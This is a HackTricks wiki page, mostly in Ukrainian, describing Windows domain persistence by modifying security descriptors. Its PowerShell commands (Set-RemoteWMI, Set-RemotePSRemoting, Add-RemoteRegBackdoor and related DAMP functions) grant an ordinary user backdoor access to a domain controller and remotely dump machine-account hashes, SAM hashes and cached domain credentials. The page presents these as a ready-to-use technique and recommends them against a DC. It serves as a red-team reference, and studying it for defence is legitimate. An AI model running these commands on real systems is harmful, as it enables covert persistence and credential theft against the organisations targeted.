# Security Descriptors

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Security Descriptors

[З документації](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Мова визначення дескриптора безпеки (SDDL) визначає формат, який використовується для опису дескриптора безпеки. SDDL використовує рядки ACE для DACL і SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`

**Дескриптори безпеки** використовуються для **зберігання** **дозволів**, які **об'єкт** має **на** **інший об'єкт**. Якщо ви можете просто **внести** **невелику зміну** в **дескриптор безпеки** об'єкта, ви можете отримати дуже цікаві привілеї над цим об'єктом без необхідності бути членом привілейованої групи.

Отже, ця техніка постійності базується на здатності отримати всі необхідні привілеї щодо певних об'єктів, щоб мати можливість виконати завдання, яке зазвичай вимагає адміністративних привілеїв, але без необхідності бути адміністратором.

### Access to WMI

Ви можете надати користувачу доступ до **віддаленого виконання WMI** [**використовуючи це**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Доступ до WinRM

Надайте доступ до **консолі winrm PS користувачу** [**використовуючи це**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Дистанційний доступ до хешів

Доступ до **реєстру** та **вивантаження хешів**, створюючи **реєстраційний бекдор за допомогою** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** щоб ви могли в будь-який момент отримати **хеш комп'ютера**, **SAM** та будь-які **кешовані облікові дані AD** на комп'ютері. Тому дуже корисно надати цей дозвіл **звичайному користувачу проти комп'ютера контролера домену**:
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Перевірте [**Silver Tickets**](silver-ticket.md), щоб дізнатися, як ви можете використовувати хеш облікового запису комп'ютера контролера домену.

{% hint style="success" %}
Дізнайтеся та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Дізнайтеся та практикуйте GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримати HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на github.

</details>
{% endhint %}
